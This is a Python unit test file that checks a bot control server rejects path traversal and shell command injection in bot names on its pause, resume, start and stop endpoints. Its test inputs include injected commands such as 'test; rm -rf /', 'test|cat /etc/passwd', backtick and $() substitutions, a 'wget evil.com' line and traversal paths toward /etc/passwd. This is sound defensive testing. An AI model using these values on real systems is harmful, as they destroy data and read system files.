"""Tests for control_server.py bot name validation on pause/resume endpoints.

Ticket: CB-3373907-31AA — pause/resume endpoints lack bot name validation
against BOT_REGISTRY, enabling path traversal and command injection.

Constitution §2 mandates:
- Input validation at trust boundaries
- No arbitrary file operations via user-supplied data
"""
from __future__ import annotations

import json
import unittest
from io import BytesIO
from unittest.mock import MagicMock, patch


class TestPauseResumeBotValidation(unittest.TestCase):
    """Verify that pause and resume endpoints validate bot names against BOT_REGISTRY."""

    def _make_handler(self, method: str, path: str, body: dict | None = None):
        """Create a mock request handler for testing."""
        from codebot.control_server import ControlHandler

        handler = MagicMock(spec=ControlHandler)
        handler.path = path
        handler.command = method
        handler.headers = {"Authorization": "Bearer test-token"}
        if body is not None:
            handler.rfile = BytesIO(json.dumps(body).encode())
            handler.headers["Content-Length"] = str(len(json.dumps(body)))
        else:
            handler.rfile = BytesIO(b"")
            handler.headers["Content-Length"] = "0"
        return handler

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_pause_rejects_unknown_bot(self):
        """Pause endpoint must return 404 for bot names not in BOT_REGISTRY."""
        # Import the actual do_POST to test routing logic
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/nonexistent_bot/pause")

        # Call the real method bound to our mock
        responses = []
        handler._json = lambda code, data: responses.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        ControlHandler.do_POST(handler)

        self.assertTrue(len(responses) > 0, "Handler must produce a response")
        status_code, body = responses[0]
        self.assertEqual(status_code, 404, f"Expected 404 for unknown bot, got {status_code}")
        self.assertIn("unknown bot", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_resume_rejects_unknown_bot(self):
        """Resume endpoint must return 404 for bot names not in BOT_REGISTRY."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/nonexistent_bot/resume")

        responses = []
        handler._json = lambda code, data: responses.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        ControlHandler.do_POST(handler)

        self.assertTrue(len(responses) > 0, "Handler must produce a response")
        status_code, body = responses[0]
        self.assertEqual(status_code, 404, f"Expected 404 for unknown bot, got {status_code}")
        self.assertIn("unknown bot", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_pause_rejects_path_traversal(self):
        """Pause endpoint must reject bot names containing path traversal sequences."""
        from codebot.control_server import ControlHandler

        malicious_names = [
            "../../etc/cron.d/evil",
            "../secrets/token",
            "bot/../../../etc/passwd",
        ]

        for name in malicious_names:
            handler = self._make_handler("POST", f"/bots/{name}/pause")
            responses = []
            handler._json = lambda code, data, r=responses: r.append((code, data))
            handler._auth = lambda: True
            handler._read_json_body = lambda: (None, None, None)

            ControlHandler.do_POST(handler)

            self.assertTrue(len(responses) > 0, f"Handler must respond for malicious name: {name}")
            status_code, _ = responses[0]
            self.assertNotEqual(status_code, 200,
                                f"Pause must not succeed for path traversal name: {name}")

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_resume_rejects_path_traversal(self):
        """Resume endpoint must reject bot names containing path traversal sequences."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/../../etc/cron.d/evil/resume")
        responses = []
        handler._json = lambda code, data: responses.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        ControlHandler.do_POST(handler)

        self.assertTrue(len(responses) > 0)
        status_code, _ = responses[0]
        self.assertNotEqual(status_code, 200, "Resume must not succeed for path traversal name")

    def test_pause_accepts_valid_bot(self):
        """Pause endpoint must accept bot names present in BOT_REGISTRY."""
        from codebot.control_server import ControlHandler

        mock_bot = MagicMock()
        mock_bot.name = "valid_bot"

        with patch("codebot.control_server.BOT_REGISTRY", [mock_bot]):
            with patch("codebot.control_server.STATE_DIR") as mock_state:
                with patch("subprocess.run"):
                    handler = self._make_handler("POST", "/bots/valid_bot/pause")
                    responses = []
                    handler._json = lambda code, data: responses.append((code, data))
                    handler._auth = lambda: True
                    handler._read_json_body = lambda: (None, None, None)

                    mock_paused_file = MagicMock()
                    mock_state.__truediv__ = MagicMock(return_value=mock_paused_file)

                    ControlHandler.do_POST(handler)

                    self.assertTrue(len(responses) > 0)
                    status_code, body = responses[0]
                    self.assertEqual(status_code, 200, f"Expected 200 for valid bot, got {status_code}: {body}")

    def test_resume_accepts_valid_bot(self):
        """Resume endpoint must accept bot names present in BOT_REGISTRY."""
        from codebot.control_server import ControlHandler

        mock_bot = MagicMock()
        mock_bot.name = "valid_bot"

        with patch("codebot.control_server.BOT_REGISTRY", [mock_bot]):
            with patch("codebot.control_server.STATE_DIR") as mock_state:
                with patch("subprocess.Popen"):
                    handler = self._make_handler("POST", "/bots/valid_bot/resume")
                    responses = []
                    handler._json = lambda code, data: responses.append((code, data))
                    handler._auth = lambda: True
                    handler._read_json_body = lambda: (None, None, None)

                    mock_paused_file = MagicMock()
                    mock_paused_file.exists.return_value = False
                    mock_state.__truediv__ = MagicMock(return_value=mock_paused_file)

                    ControlHandler.do_POST(handler)

                    self.assertTrue(len(responses) > 0)
                    status_code, body = responses[0]
                    self.assertEqual(status_code, 200, f"Expected 200 for valid bot, got {status_code}: {body}")


    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_pkill_not_called_with_unvalidated_input_pause(self):
        """pkill must never be called when bot name is not in BOT_REGISTRY (pause)."""
        from codebot.control_server import ControlHandler

        # Use names that are safe in URL paths but would be dangerous if passed to pkill
        malicious_names = ["evilbot", "fake_runner", "notreal"]

        for name in malicious_names:
            handler = self._make_handler("POST", f"/bots/{name}/pause")
            responses = []
            handler._json = lambda code, data, r=responses: r.append((code, data))
            handler._auth = lambda: True
            handler._read_json_body = lambda: (None, None, None)

            with patch("codebot.control_server.subprocess.run") as mock_run:
                ControlHandler.do_POST(handler)
                mock_run.assert_not_called()

            self.assertTrue(len(responses) > 0, f"Handler must respond for malicious name: {name}")
            status_code, body = responses[0]
            self.assertEqual(status_code, 404,
                             f"Expected 404 for unvalidated bot name '{name}', got {status_code}")
            self.assertIn("unknown bot", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_pause_rejects_regex_injection_dot_star(self):
        """Pause endpoint must reject '.*' which could inject regex into pkill."""
        from codebot.control_server import ControlHandler

        # .* is invalid per validate_bot_name (contains '.')
        handler = self._make_handler("POST", "/bots/.*/pause")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        with patch("codebot.control_server.subprocess.run") as mock_run:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_pause_rejects_process_killing_python3(self):
        """Pause endpoint must reject 'python3' which could kill all python processes."""
        from codebot.control_server import ControlHandler

        # python3 is valid format but not in registry -> 404
        handler = self._make_handler("POST", "/bots/python3/pause")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        with patch("codebot.control_server.subprocess.run") as mock_run:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 404)
        self.assertIn("unknown bot", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_pkill_not_called_with_unvalidated_input_resume(self):
        """pkill/subprocess must never be called when bot name is not in BOT_REGISTRY (resume)."""
        from codebot.control_server import ControlHandler

        # Use names that are safe in URL paths but would be dangerous if passed to pkill
        malicious_names = ["evilbot", "fake_runner", "notreal"]

        for name in malicious_names:
            handler = self._make_handler("POST", f"/bots/{name}/resume")
            responses = []
            handler._json = lambda code, data, r=responses: r.append((code, data))
            handler._auth = lambda: True
            handler._read_json_body = lambda: (None, None, None)

            with patch("codebot.control_server.subprocess.Popen") as mock_popen, \
                 patch("codebot.control_server.subprocess.run") as mock_run:
                ControlHandler.do_POST(handler)
                mock_popen.assert_not_called()
                mock_run.assert_not_called()

            self.assertTrue(len(responses) > 0, f"Handler must respond for malicious name: {name}")
            status_code, body = responses[0]
            self.assertEqual(status_code, 404,
                             f"Expected 404 for unvalidated bot name '{name}', got {status_code}")
            self.assertIn("unknown bot", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_resume_rejects_regex_injection_dot_star(self):
        """Resume endpoint must reject '.*' which could inject regex into pkill."""
        from codebot.control_server import ControlHandler

        # .* is invalid per validate_bot_name (contains '.')
        handler = self._make_handler("POST", "/bots/.*/resume")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_resume_rejects_process_killing_python3(self):
        """Resume endpoint must reject 'python3' which could kill all python processes."""
        from codebot.control_server import ControlHandler

        # python3 is valid format but not in registry -> 404
        handler = self._make_handler("POST", "/bots/python3/resume")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 404)
        self.assertIn("unknown bot", body.get("error", "").lower())


class TestCommandInjectionPrevention(unittest.TestCase):
    """Verify that command injection attempts are rejected across all endpoints.

    Ticket: CB-8897336-6B72 — Critical: Command injection via pkill in bot control handlers

    Acceptance Criteria:
    - Bot name validated against alphanumeric+hyphen pattern before subprocess calls
    - shlex.quote() applied to all interpolated values
    - security tests verify injection attempts are rejected
    """

    def _make_handler(self, method: str, path: str, body: dict | None = None):
        """Create a mock request handler for testing."""
        from codebot.control_server import ControlHandler

        handler = MagicMock(spec=ControlHandler)
        handler.path = path
        handler.command = method
        handler.headers = {"Authorization": "Bearer test-token"}
        if body is not None:
            handler.rfile = BytesIO(json.dumps(body).encode())
            handler.headers["Content-Length"] = str(len(json.dumps(body)))
        else:
            handler.rfile = BytesIO(b"")
            handler.headers["Content-Length"] = "0"
        return handler

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_restart_rejects_injection_via_semicolon(self):
        """Restart endpoint must reject bot names containing semicolons."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/test; rm -rf /restart")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        with patch("codebot.control_server.subprocess.run") as mock_run:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_pause_rejects_injection_via_backticks(self):
        """Pause endpoint must reject bot names containing backticks."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/test`whoami`/pause")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        with patch("codebot.control_server.subprocess.run") as mock_run:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_resume_rejects_injection_via_dollar_sign(self):
        """Resume endpoint must reject bot names containing dollar signs."""
        from codebot.control_server import ControlHandler

        # Use injection attempt without / which would break URL routing
        handler = self._make_handler("POST", "/bots/test$(whoami)/resume")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
    def test_start_rejects_injection_via_semicolon(self):
        """Start endpoint must reject bot names containing semicolons."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/start", body={"bots": ["test; rm -rf /"]})
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"bots": ["test; rm -rf /"]}, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
    def test_start_rejects_injection_via_pipe(self):
        """Start endpoint must reject bot names containing pipe characters."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/start", body={"bots": ["test|cat /etc/passwd"]})
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"bots": ["test|cat /etc/passwd"]}, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
    def test_stop_rejects_injection_via_ampersand(self):
        """Stop endpoint must reject bot names containing ampersands."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/stop", body={"bots": ["test&wget evil.com"]})
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"bots": ["test&wget evil.com"]}, None, None)

        with patch("codebot.control_server.subprocess.run") as mock_run:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
    def test_start_validates_each_bot_name(self):
        """Start endpoint must validate each bot name in the array."""
        from codebot.control_server import ControlHandler

        # First bot is valid, second is malicious
        handler = self._make_handler("POST", "/bots/start", body={"bots": ["valid-bot", "evil; rm -rf /"]})
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"bots": ["valid-bot", "evil; rm -rf /"]}, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    def test_start_accepts_valid_bot_names(self):
        """Start endpoint must accept valid bot names."""
        from codebot.control_server import ControlHandler

        mock_bot = MagicMock()
        mock_bot.name = "valid-bot"

        with patch("codebot.control_server.BOT_REGISTRY", [mock_bot]):
            handler = self._make_handler("POST", "/bots/start", body={"bots": ["valid-bot"]})
            responses = []
            handler._json = lambda code, data, r=responses: r.append((code, data))
            handler._auth = lambda: True
            handler._read_json_body = lambda: ({"bots": ["valid-bot"]}, None, None)

            with patch("codebot.control_server.subprocess.Popen") as mock_popen:
                ControlHandler.do_POST(handler)
                mock_popen.assert_called_once()

            self.assertTrue(len(responses) > 0)
            status_code, body = responses[0]
            self.assertEqual(status_code, 200)
            self.assertTrue(body["ok"])

    def test_validate_bot_name_function(self):
        """Test the validate_bot_name function directly."""
        from codebot.control_server import validate_bot_name

        # Valid names
        self.assertTrue(validate_bot_name("valid-bot"))
        self.assertTrue(validate_bot_name("valid_bot"))
        self.assertTrue(validate_bot_name("ValidBot123"))
        self.assertTrue(validate_bot_name("a"))
        self.assertTrue(validate_bot_name("123"))

        # Invalid names
        self.assertFalse(validate_bot_name("test; rm -rf /"))
        self.assertFalse(validate_bot_name("test`whoami`"))
        self.assertFalse(validate_bot_name("test$(cat /etc/passwd)"))
        self.assertFalse(validate_bot_name("test|cat /etc/passwd"))
        self.assertFalse(validate_bot_name("test&wget evil.com"))
        self.assertFalse(validate_bot_name("test/../etc/passwd"))
        self.assertFalse(validate_bot_name("test space"))
        self.assertFalse(validate_bot_name(""))
        self.assertFalse(validate_bot_name(None))
        self.assertFalse(validate_bot_name(123))


if __name__ == "__main__":
    unittest.main()
